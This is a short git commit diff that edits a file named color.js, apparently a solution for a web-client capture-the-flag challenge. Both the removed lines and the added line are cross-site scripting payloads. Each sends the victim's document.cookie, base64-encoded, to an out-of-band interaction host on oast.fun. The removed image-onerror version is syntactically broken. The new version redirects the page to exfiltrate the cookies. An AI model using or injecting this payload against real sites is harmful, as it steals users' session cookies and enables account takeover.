8a79bf49ca6838525d0f648d6b9d1c895aa31cd2
sytryx <t.bruant18+mssis@gmail.com>
2026-04-27 21:13:09 +0200

    Update color.js

--- web-client/ch62/color.js
+++ web-client/ch62/color.js
@@ -1,4 +1,1 @@
-const img = document.createElement("img");
-img.src = "x"; // chemin ou URL de l'image
-img.onerror = "https://ustaarpjntgmaqejdyiw68tz588mk0rll.oast.fun/?data="+btoa(document.cookie)";
-document.body.appendChild(img);
+window.location.href="https://ustaarpjntgmaqejdyiw68tz588mk0rll.oast.fun/?data="+btoa(document.cookie);
